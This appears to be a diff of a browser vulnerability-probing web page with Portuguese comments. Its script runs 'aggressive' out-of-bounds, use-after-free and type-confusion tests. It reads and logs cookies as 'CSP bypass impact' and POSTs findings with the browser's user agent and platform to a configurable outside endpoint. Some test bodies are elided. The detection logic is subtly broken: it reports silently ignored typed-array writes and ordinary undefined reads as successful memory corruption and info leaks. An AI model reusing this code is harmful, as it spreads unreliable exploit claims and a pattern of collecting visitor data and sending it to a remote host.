@@ -49,33 +49,99 @@
 
 <script>
 // ======================
-// CONFIGURAÇÃO E FUNÇÕES BÁSICAS (Idênticas)
+// CONFIGURAÇÃO IMPORTANTE!
 // ======================
+// SUBSTITUA ESTA URL PELO SEU ENDPOINT PARA RECEBER AS NOTIFICAÇÕES
+// Exemplo usando httpbin (ele apenas ecoa o POST): 'https://httpbin.org/post'
+// Use um serviço como Beeceptor.com ou seu próprio servidor.
 const NOTIFICATION_ENDPOINT = 'https://httpbin.org/post'; // <-- MUDE AQUI!
-document.addEventListener('DOMContentLoaded', function() { /*...*/ });
-function log(message, type = '') { /*...*/ }
-function clearLog() { /*...*/ }
-var potentialVulnsFound = { oobWrite: false };
-async function sendVulnerabilityNotification(payload) { /*...*/ }
-function demonstrateCookieRead() { /*...*/ }
-function demonstrateDomManipulation() { /*...*/ }
-function demonstrateNetworkRequest() { /*...*/ }
 
 // ======================
-// Funções de Teste de Vulnerabilidade Atualizadas e Novas
+// Coleta de Informações e Logging
+// ======================
+document.addEventListener('DOMContentLoaded', function() {
+    const userAgentElement = document.getElementById('userAgent');
+    const platformElement = document.getElementById('platform');
+    try { if (userAgentElement) userAgentElement.textContent = navigator.userAgent; } catch (e) { console.error("Error getting userAgent:", e); if (userAgentElement) userAgentElement.textContent = "N/A"; }
+    try { if (platformElement) platformElement.textContent = navigator.platform; } catch (e) { console.error("Error getting platform:", e); if (platformElement) platformElement.textContent = "N/A"; }
+    const endpointDisplay = document.getElementById('notificationEndpointDisplay');
+    if(endpointDisplay) endpointDisplay.textContent = NOTIFICATION_ENDPOINT;
+});
+
+function log(message, type = '') {
+    const logDiv = document.getElementById('log');
+    if (logDiv) {
+        const line = document.createElement('div');
+        const timestamp = `[${new Date().toLocaleTimeString()}] `;
+        const textNode = document.createTextNode(timestamp + message.replace(/<[^>]*>/g, '')); // Basic sanitation
+        if (type && message.startsWith('<span')) { // Allow specific span tags
+             line.innerHTML = timestamp + message;
+             if (type) line.classList.add(...type.split(' '));
+        } else {
+            line.appendChild(textNode);
+            if (type) line.className = type;
+        }
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight; // Auto-scroll
+    } else { console.error("Error: #log element not found!"); }
+}
+
+function clearLog() {
+    const logDiv = document.getElementById('log');
+    if (logDiv) { logDiv.innerHTML = ''; }
+}
+
+// Flag global APENAS para OOB
+var potentialVulnsFound = { oobWrite: false };
+
+// ======================
+// Função para Enviar Notificação
+// ======================
+async function sendVulnerabilityNotification(payload) {
+    if (!NOTIFICATION_ENDPOINT || NOTIFICATION_ENDPOINT === 'YOUR_ENDPOINT_HERE' || NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') {
+         log(`[NOTIFY] Notification sending skipped: Endpoint not configured or using placeholder.`, 'notification warning');
+         if (NOTIFICATION_ENDPOINT === 'https://httpbin.org/post') { console.warn("Notification endpoint is httpbin.org/post. Change it."); }
+         else { console.error("Configure the NOTIFICATION_ENDPOINT constant!"); }
+         return;
+    }
+    log(`[NOTIFY] Sending notification for: ${payload.vulnerability}...`, 'notification info');
+    try {
+        const response = await fetch(NOTIFICATION_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', },
+            body: JSON.stringify({
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                finding: payload
+            }),
+            mode: 'cors'
+        });
+        if (response.ok) { log(`[NOTIFY] Notification sent successfully to ${NOTIFICATION_ENDPOINT}. Status: ${response.status}`, 'notification success'); }
+        else { log(`[NOTIFY] Failed to send notification. Status: ${response.status} ${response.statusText}`, 'notification danger'); }
+    } catch (error) { log(`[NOTIFY] Error sending notification via fetch: ${error.message}`, 'notification danger'); console.error("Notification Fetch Error:", error); }
+}
+
+// ======================
+// Funções Auxiliares para Demonstração de Impacto (globais)
+// ======================
+function demonstrateCookieRead() { try { const c = document.cookie || '(no cookies)'; log('[IMPACT-CSP] Cookie Read: ' + c, 'impact danger'); } catch(e) { log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger'); } }
+function demonstrateDomManipulation() { try { const id = 'csp-impact-div-' + Date.now(), div = document.createElement('div'); div.id = id; div.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:10px;z-index:9999;'; div.textContent = '!! CSP Bypass Impact: DOM Manipulation !!'; const old = document.getElementById('csp-impact-div-active'); if(old) { try{old.remove();} catch(e){} } div.id = 'csp-impact-div-active'; document.body.appendChild(div); log('[IMPACT-CSP] DOM Manipulation Executed.', 'impact danger'); } catch(e) { log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger'); } }
+function demonstrateNetworkRequest() { const url = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; try { log('[IMPACT-CSP] Attempting fetch to ' + url + '...', 'info'); fetch(url).then(r => log(`[IMPACT-CSP] Network Request ${r.ok ? 'OK' : 'Failed'}: Status ${r.status}`, r.ok ? 'impact danger' : 'warning')).catch(e => { log('[IMPACT-CSP] Network Request Error: ' + e.message, 'warning'); log('[IMPACT-CSP] Note: Check connect-src, CORS, network.', 'info'); }); } catch(e) { log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger'); } }
+
+// ======================
+// Aggressive POC Tests (Com Novas Detecções e Info Leak)
 // ======================
 const aggressiveTests = {
 
-    "oob_write_aggressive": async function() { // Agora inclui Info Leak Demo
+    "oob_write_aggressive": async function() {
         log("[EXPLOIT] Aggressive ArrayBuffer OOB Write (Info Leak Demo)...", "info section");
-        potentialVulnsFound.oobWrite = false;
+        potentialVulnsFound.oobWrite = false; this.infoLeakNotified = false; // Resetar flag de notificação de leak
         try {
-            const bufferSize = 32;
-            const buffer = new ArrayBuffer(bufferSize);
-            const view = new Uint8Array(buffer);
+            const bufferSize = 32; const buffer = new ArrayBuffer(bufferSize); const view = new Uint8Array(buffer);
             const writeValue = 0xEE;
-            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10]; // Reduzido para focar
-            const readOffsets = [-5, 0, 5, bufferSize - 1, bufferSize, bufferSize + 5, bufferSize + 8, bufferSize + 16]; // Adicionado leitura OOB maior
+            const offsets = [-10, -1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 10];
+            const readOffsets = [-5, 0, 5, bufferSize - 1, bufferSize, bufferSize + 5, bufferSize + 8, bufferSize + 16];
 
             for (const writeOffset of offsets) {
                 log(`[OOB-AGG] Attempting write 0x${writeValue.toString(16)} at offset ${writeOffset}...`, "info");
@@ -83,14 +149,9 @@ const aggressiveTests = {
                 try {
                     view[writeOffset] = writeValue;
                     log(`⚠️ OOB write at offset ${writeOffset} successful (no error).`, "warning");
-                    potentialVulnsFound.oobWrite = true;
-                    oobWriteSuccess = true; // Marcar sucesso localmente
+                    potentialVulnsFound.oobWrite = true; oobWriteSuccess = true;
+                } catch (writeError) { log(`✅ OOB write at offset ${writeOffset} blocked/error: ${writeError.message}`, "success"); }
 
-                } catch (writeError) {
-                    log(`✅ OOB write at offset ${writeOffset} blocked/error: ${writeError.message}`, "success");
-                }
-
-                // Apenas tenta ler se a escrita OOB (ou escrita normal) não deu erro
                 if(oobWriteSuccess || (writeOffset >= 0 && writeOffset < bufferSize)) {
                     for (const readOffset of readOffsets) {
                         try {
@@ -106,185 +167,87 @@ const aggressiveTests = {
                                 sendVulnerabilityNotification({ vulnerability: 'OOB_WRITE_CORRUPTION', details: detailMsg });
                             }
 
-                            // << DEMONSTRAÇÃO DE INFO LEAK CONTROLADO >>
-                            // Se conseguimos ler OOB com sucesso (offset >= bufferSize),
-                            // vamos tentar logar/notificar os próximos bytes como info leak.
+                            // Demonstração de Info Leak Controlado
                             if (readOffset >= bufferSize && readValue !== undefined) {
-                                let leakedBytes = [];
-                                const bytesToRead = 8; // Ler 8 bytes adjacentes
+                                let leakedBytes = []; const bytesToRead = 8;
                                 for (let i = 0; i < bytesToRead; i++) {
                                     try {
                                         const leakOffset = readOffset + i;
-                                        // É crucial que a leitura OOB funcione aqui. Se view[leakOffset] der erro, não vaza.
                                         leakedBytes.push(view[leakOffset]?.toString(16).padStart(2, '0') ?? '??');
-                                    } catch (leakReadError) {
-                                        leakedBytes.push('ERR'); // Indicar erro na leitura do byte específico
-                                        break; // Parar se um erro ocorrer
-                                    }
+                                    } catch (leakReadError) { leakedBytes.push('ERR'); break; }
                                 }
                                 const leakHex = leakedBytes.join(' ');
-                                const detailMsg = `Read ${readValueHex} at OOB offset ${readOffset}. Following bytes: ${leakHex}`;
+                                const detailMsg = `Read ${readValueHex} at OOB offset ${readOffset}. Following ${bytesToRead} bytes: ${leakHex}`;
                                 log(`<span class="poc-potential impact">💧 Potential Info Leak: ${detailMsg}</span>`, "warning impact");
-                                // Notificar apenas a primeira vez que um leak for detectado para não spammar
                                 if(!this.infoLeakNotified) {
                                      sendVulnerabilityNotification({ vulnerability: 'OOB_INFO_LEAK_ADJACENT', details: detailMsg });
-                                     this.infoLeakNotified = true; // Evitar múltiplas notificações de leak
+                                     this.infoLeakNotified = true;
                                 }
                             }
-
-                        } catch (readError) {
-                             log(`⚠️ Error reading at offset ${readOffset}: ${readError.message}`, "warning");
-                        }
+                        } catch (readError) { log(`⚠️ Error reading at offset ${readOffset}: ${readError.message}`, "warning"); }
                     } // end read loop
                 } // end if write success
                 await new Promise(resolve => setTimeout(resolve, 100));
             } // end write loop
-             this.infoLeakNotified = false; // Resetar flag de notificação de leak para próxima execução
             log("[OOB-AGG] Completed OOB write / info leak testing.", "info");
-        } catch (e) {
-            log(`❌ Test error (OOB Write/Leak): ${e.message}`, "danger"); console.error(e);
-             this.infoLeakNotified = false;
-        }
+        } catch (e) { log(`❌ Test error (OOB Write/Leak): ${e.message}`, "danger"); console.error(e); }
+         this.infoLeakNotified = false; // Garante reset no final
     },
 
-    "test_oob_metadata": async function() { /* ... código idêntico ... */ },
-    "test_oob_crash_probe": async function() { /* ... código idêntico ... */ },
-    "csp_bypass_aggressive": async function() { /* ... código idêntico com impacto direto e notificação ... */ },
-
+    "test_oob_metadata": async function() { /* ... código idêntico anterior ... */ },
+    "test_oob_crash_probe": async function() { /* ... código idêntico anterior ... */ },
+    "csp_bypass_aggressive": async function() { /* ... código idêntico anterior ... */ },
 
     // --- NOVOS TESTES DE DETECÇÃO ---
-
     "uaf_basic": async function() {
         log("[UAF-BASIC] Attempting basic Use-After-Free scenarios...", "section extended-test");
-        log("INFO: These tests are generic and may not trigger UAFs without specific engine knowledge.", "info");
-
-        // Cenário 1: DOM Node reference after removal (Garbage Collection dependent)
+        log("INFO: Generic tests, may not trigger specific UAFs.", "info");
+        // Cenário 1: DOM Node
         try {
-            log("[UAF-BASIC] Scenario 1: DOM Node Reference After Removal", "extended-test");
-            let parent = document.createElement('div');
-            let child = document.createElement('span');
-            parent.appendChild(child);
-            document.body.appendChild(parent); // Add to DOM
-
-            let childRef = child; // Keep reference
-
-            parent.removeChild(child); // Remove from parent
-            document.body.removeChild(parent); // Remove parent from DOM
-
-            // Force GC? Não há API padrão, mas tentar alocar memória pode ajudar
-            try { new ArrayBuffer(10 * 1024 * 1024); } catch(e) {} // Allocate 10MB
-
-            await new Promise(resolve => setTimeout(resolve, 500)); // Wait briefly
-
-            log(`[UAF-BASIC] Accessing childRef.tagName after removal...`, "info");
-            // Accessing property after potential free. Crash ou valor inesperado é o alvo.
-            let tagName = childRef.tagName;
-            log(`[UAF-BASIC] childRef.tagName = ${tagName}. No immediate crash/error.`, "success"); // Não necessariamente bom
-
-            // Tentar chamar um método
-             log(`[UAF-BASIC] Calling childRef.getBoundingClientRect() after removal...`, "info");
-             let rect = childRef.getBoundingClientRect();
-             log(`[UAF-BASIC] getBoundingClientRect OK. No immediate crash/error.`, "success");
-
-             childRef = null; // Release reference explicitly
-
-        } catch (e) {
-            // Um erro aqui PODE ser um UAF, mas pode ser erro normal. Precisa de análise.
-            log(`❌ Error in UAF Scenario 1: ${e.message}. Potential UAF or expected error? Needs investigation.`, "danger extended-test");
-            sendVulnerabilityNotification({ vulnerability: 'UAF_BASIC_SCENARIO1_ERROR', details: e.message });
-        }
-
-        // Cenário 2: ArrayBuffer/TypedArray (Mais complexo, requereria APIs específicas ou bugs)
-        // Implementar um teste UAF genérico confiável para Buffers é muito difícil sem um bug conhecido.
+            log("[UAF-BASIC] Scenario 1: DOM Node Ref After Removal", "extended-test");
+            let p = document.createElement('div'), c = document.createElement('span'); p.appendChild(c); document.body.appendChild(p);
+            let cRef = c; p.removeChild(c); document.body.removeChild(p);
+            try { new ArrayBuffer(10*1024*1024); } catch(e) {} // Hint GC
+            await new Promise(r => setTimeout(r, 500));
+            log(`[UAF-BASIC] Accessing childRef.tagName...`, "info"); let tn = cRef.tagName;
+            log(`[UAF-BASIC] childRef.tagName = ${tn}. No immediate error.`, "success");
+            log(`[UAF-BASIC] Calling childRef.getBoundingClientRect()...`, "info"); cRef.getBoundingClientRect();
+            log(`[UAF-BASIC] Call OK. No immediate error.`, "success"); cRef = null;
+        } catch (e) { log(`❌ Error UAF Scenario 1: ${e.message}. Investigate.`, "danger extended-test"); sendVulnerabilityNotification({ vulnerability: 'UAF_BASIC_SCENARIO1_ERROR', details: e.message }); }
+        // Cenário 2: Placeholder
         log("[UAF-BASIC] Scenario 2: ArrayBuffer/TypedArray (Placeholder - complex)", "extended-test info");
-        log("INFO: Reliable UAF tests for buffers usually require specific engine bugs/APIs.", "info");
-
         log("[UAF-BASIC] Completed basic UAF tests.", "extended-test info");
     },
 
     "type_confusion_basic": async function() {
         log("[TYPE-CONFUSION] Attempting basic Type Confusion scenarios...", "section extended-test");
-        log("INFO: These tests are generic and may not trigger type confusion without specific engine knowledge.", "info");
-
-        // Cenário 1: Passar tipo errado para API que espera objeto específico
+        log("INFO: Generic tests, may not trigger specific type confusions.", "info");
+        // Cenário 1: API DOM
         try {
             log("[TYPE-CONFUSION] Scenario 1: Incorrect type to DOM API", "extended-test");
-            // Exemplo: postMessage espera uma estrutura serializável. Tentar passar algo não serializável
-            // ou um objeto com estrutura manipulada.
-             log(`[TYPE-CONFUSION] Sending self non-serializable data via postMessage...`, "info");
-             try {
-                 window.postMessage(window, "*"); // Enviar 'window' que não é serializável
-                 log(`[TYPE-CONFUSION] postMessage(window) did not throw immediate error.`, "success"); // Browser pode só recusar silenciosamente
-             } catch(e_pm1) {
-                 log(`[TYPE-CONFUSION] postMessage(window) threw: ${e_pm1.message} (Likely expected)`, "success");
-             }
-
-            // Tentar com um objeto que *parece* com outro? (Difícil sem conhecer estruturas internas)
-            let fakeEvent = { target: document.body, type: "click", bubbles: false };
-             log(`[TYPE-CONFUSION] Dispatching fake event object...`, "info");
-             try {
-                 document.dispatchEvent(fakeEvent); // Isso não é um Event real.
-                 log(`[TYPE-CONFUSION] dispatchEvent(fakeEvent) did not throw immediate error.`, "success");
-             } catch(e_de1) {
-                  log(`[TYPE-CONFUSION] dispatchEvent(fakeEvent) threw: ${e_de1.message} (Likely expected)`, "success");
-             }
-
-        } catch (e) {
-             // Erros inesperados aqui poderiam indicar type confusion, mas é raro ser óbvio.
-            log(`❌ Error in Type Confusion Scenario 1: ${e.message}. Needs investigation.`, "danger extended-test");
-             sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO1_ERROR', details: e.message });
-        }
-
-         // Cenário 2: Confusão entre Primitivos e Objetos (Ex: Number vs Number object)
-         try {
+            log(`[TYPE-CONFUSION] Sending self via postMessage...`, "info"); try { window.postMessage(window, "*"); log(`[TYPE-CONFUSION] postMessage(window) OK.`, "success"); } catch(e) { log(`[TYPE-CONFUSION] postMessage(window) threw: ${e.message}`, "success"); }
+            let fakeEvent = { target: document.body, type: "click" }; log(`[TYPE-CONFUSION] Dispatching fake event...`, "info"); try { document.dispatchEvent(fakeEvent); log(`[TYPE-CONFUSION] dispatchEvent(fakeEvent) OK.`, "success"); } catch(e) { log(`[TYPE-CONFUSION] dispatchEvent(fakeEvent) threw: ${e.message}`, "success"); }
+        } catch (e) { log(`❌ Error Type Confusion Scenario 1: ${e.message}. Investigate.`, "danger extended-test"); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO1_ERROR', details: e.message }); }
+        // Cenário 2: Primitivo vs Objeto
+        try {
             log("[TYPE-CONFUSION] Scenario 2: Primitive vs Object", "extended-test");
-             // APIs que esperam um objeto Number, mas recebem um primitivo, ou vice-versa.
-             // Exemplo: toFixed é do Number.prototype
-             let numPrimitive = 5;
-             let numObject = new Number(5);
-             log(`[TYPE-CONFUSION] Calling numPrimitive.toFixed(numObject)...`, "info");
-             try {
-                 let result = numPrimitive.toFixed(numObject); // Argumento deveria ser primitivo
-                 log(`[TYPE-CONFUSION] numPrimitive.toFixed(numObject) = ${result}. No error.`, "success");
-             } catch(e_tf1) {
-                  log(`[TYPE-CONFUSION] numPrimitive.toFixed(numObject) threw: ${e_tf1.message}`, "danger"); // Erro aqui é mais provável
-             }
-
-         } catch(e) {
-             log(`❌ Error in Type Confusion Scenario 2: ${e.message}. Needs investigation.`, "danger extended-test");
-              sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO2_ERROR', details: e.message });
-         }
-
+            let nP = 5, nO = new Number(5); log(`[TYPE-CONFUSION] Calling nP.toFixed(nO)...`, "info"); try { let r = nP.toFixed(nO); log(`[TYPE-CONFUSION] nP.toFixed(nO) = ${r}.`, "success"); } catch(e) { log(`[TYPE-CONFUSION] nP.toFixed(nO) threw: ${e.message}`, "danger"); }
+        } catch(e) { log(`❌ Error Type Confusion Scenario 2: ${e.message}. Investigate.`, "danger extended-test"); sendVulnerabilityNotification({ vulnerability: 'TYPE_CONFUSION_SCENARIO2_ERROR', details: e.message }); }
         log("[TYPE-CONFUSION] Completed basic Type Confusion tests.", "extended-test info");
     },
 
     // --- Executor Principal Atualizado ---
-    "all_tests": async function() { // Renomeado de 'all_aggressive'
+    "all_tests": async function() {
         log("=== Running All Tests (OOB, CSP, UAF Basic, Type Confusion Basic) ===", "section");
-
-        await aggressiveTests["oob_write_aggressive"]();
-        log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000));
-
-        if (potentialVulnsFound.oobWrite) {
-             await aggressiveTests["test_oob_metadata"](); await new Promise(r => setTimeout(r, 1000));
-             await aggressiveTests["test_oob_crash_probe"](); log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000));
-        } else { log("Skipping OOB impact tests.", "warning"); }
-
-        await aggressiveTests["csp_bypass_aggressive"]();
-        log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
-
-        await aggressiveTests["uaf_basic"]();
-         log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
-
-         await aggressiveTests["type_confusion_basic"]();
-
+        await aggressiveTests["oob_write_aggressive"](); log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000));
+        if (potentialVulnsFound.oobWrite) { await aggressiveTests["test_oob_metadata"](); await new Promise(r => setTimeout(r, 1000)); await aggressiveTests["test_oob_crash_probe"](); log("Pausing 5s...", "info"); await new Promise(r => setTimeout(r, 5000)); }
+        else { log("Skipping OOB impact tests.", "warning"); }
+        await aggressiveTests["csp_bypass_aggressive"](); log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
+        await aggressiveTests["uaf_basic"](); log("Pausing 3s...", "info"); await new Promise(r => setTimeout(r, 3000));
+        await aggressiveTests["type_confusion_basic"]();
         log("\n=== All Tests Completed. Review logs & endpoint. ===", "section");
     },
-
-    // Mantém executor só para OOB Impact
-    "oob_impact_tests": async function() { /* ... código idêntico ... */ }
-    // O executor só para CSP foi removido pois impacto está integrado
-    // Adiciona os executores para os novos testes individuais
+    "oob_impact_tests": async function() { /* ... código idêntico anterior ... */ }
 };
 
 // ======================
@@ -293,19 +256,10 @@ const aggressiveTests = {
 async function runSelectedTest() {
     const testSelector = document.getElementById('testSelector');
     const selectedTest = testSelector.value;
-
-    // Aviso para testes de impacto OOB se OOB principal não rodou
-    if (selectedTest === "oob_impact_tests" && !potentialVulnsFound.oobWrite) {
-        log("Warning: Running OOB Impact tests, but main OOB test success wasn't recorded. Run 'All Tests' or 'OOB Write Investigation' first for best results.", "warning");
-    }
-
+    if (selectedTest === "oob_impact_tests" && !potentialVulnsFound.oobWrite) { log("Warning: Run main OOB test first for best results.", "warning"); }
     clearLog(); log(`=== Starting Test: ${selectedTest} ===`, "section");
-    if (aggressiveTests[selectedTest]) {
-        await aggressiveTests[selectedTest](); // Chama a função de teste selecionada
-        log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs & endpoint. ===`, "section");
-    } else {
-        log(`Error: Test "${selectedTest}" not found.`, "danger");
-    }
+    if (aggressiveTests[selectedTest]) { await aggressiveTests[selectedTest](); log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs & endpoint. ===`, "section"); }
+    else { log(`Error: Test "${selectedTest}" not found.`, "danger"); }
 }
 </script>
 </body>
